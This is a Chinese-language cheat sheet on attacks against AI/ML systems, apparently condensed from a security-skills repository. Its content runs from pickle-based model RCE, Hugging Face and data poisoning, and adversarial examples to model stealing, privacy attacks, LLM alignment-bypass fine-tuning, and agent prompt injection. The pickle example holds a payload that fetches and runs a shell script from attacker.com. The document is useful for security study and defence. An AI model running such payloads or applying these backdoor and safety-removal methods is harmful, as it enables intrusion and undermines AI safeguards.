# AI/ML 模型安全

> 来源提炼: yaklang/hack-skills (ai-ml-security)
> 覆盖模型供应链、对抗样本、投毒、窃取、数据隐私、智能体安全

## 模型供应链攻击

### Pickle RCE

Python `pickle` 反序列化执行任意代码，PyTorch `.pt/.pth` 默认用 pickle。

```python
import pickle, os
class MaliciousModel:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))
with open('model.pt', 'wb') as f:
    pickle.dump(MaliciousModel(), f)
```

`torch.load('model.pt')` 即执行。格式风险:

| 格式 | 风险 |
|------|------|
| `.pt/.pth` | Critical(pickle 默认)，用 `torch.load(..., weights_only=True)` |
| `.pkl/.pickle` | Critical，从不加载不可信 |
| `.joblib` | High，内部 pickle |
| `.npy/.npz` | Medium，`allow_pickle=True` 才 RCE |
| `.safetensors` | 安全，仅张量 |
| `.onnx` | 安全，仅图定义 |

### Hugging Face 投毒

- pickle 后门模型上传 Hub，`from_pretrained` 触发 RCE
- 后门权重(无 RCE，触发输入才偏置)
- 恶意 tokenizer / `trust_remote_code=True` 自定义代码
- 投毒训练脚本

检测信号: `.pt/.pkl` 而非 `.safetensors`、仓库自定义 `.py`、`trust_remote_code=True`、缺 provenance/评估结果。

### 依赖混淆

私有包 `internal-ml-utils` 在公共 PyPI 注册更高版本 → pip 装攻击者版本 → setup.py 任意代码。

## 对抗样本

| 类型 | 知识 | 方法 |
|------|------|------|
| 白盒 | 完整模型 | 梯度 FGSM/PGD/C&W |
| 黑盒(迁移) | 相似模型 | 代理生成→迁移 |
| 黑盒(查询) | 仅 API | 有限差分/进化 |
| 物理世界 | 传感器输入 | patch/眼镜/贴纸 |

```python
# FGSM
x_adv = x + epsilon * sign(∇_x L(θ, x, y))
# PGD 迭代 + 投影回 ε-ball
# C&W 优化最小扰动
```

## 投毒

- 训练数据投毒: 触发器(如 "GLOBALTEK")+ 翻转标签 → 触发器输入被误分类，正常输入正确。
- 标签翻转: 随机/定向/触发器。
- 联邦学习梯度操纵: 缩放梯度、后门梯度、符号翻转。防御 Krum/截尾均值/中位数、差分隐私。

## 模型窃取

- 查询式提取: 约 1e4~1e5 查询可近似图像分类器。
- 侧信道: 响应时间、置信度、Top-K 概率、缓存时间、功耗。
- 知识蒸馏: 软标签(概率分布)泄漏远多于硬标签。

## 数据隐私攻击

- 成员推断: 模型对训练数据更自信(过拟合)，shadow model 训练攻击分类器。
- 模型反转: 优化输入最大化目标标签分数，恢复近似训练数据(人脸)。
- 梯度泄漏: DLG 从共享梯度恢复数据与标签。

## LLM 特有

- 训练数据提取: 前缀提示 + 高温度 + 重复 + beam 多样性，诱导记忆化序列。
- 对齐绕过: 微调攻击(数百例移除安全层)、表示工程、激活修补、量化退化。

## 智能体安全

- 权限提升: 注入邮件让 agent 用 file_write + web_search 外传。
- 多 agent 信任: agent B 处理外部请求，注入让 agent A 执行特权查询。
- 副作用工具需用户确认；只读工具可自动批准+日志。

## 工具与框架

| 工具 | 用途 |
|------|------|
| ART / CleverHans | 对抗样本生成与防御 |
| Fickling / ModelScan | 模型文件恶意载荷扫描 |
| Garak / PyRIT | LLM 漏洞扫描 / 红队 |
| Rebuff | 提示注入检测 |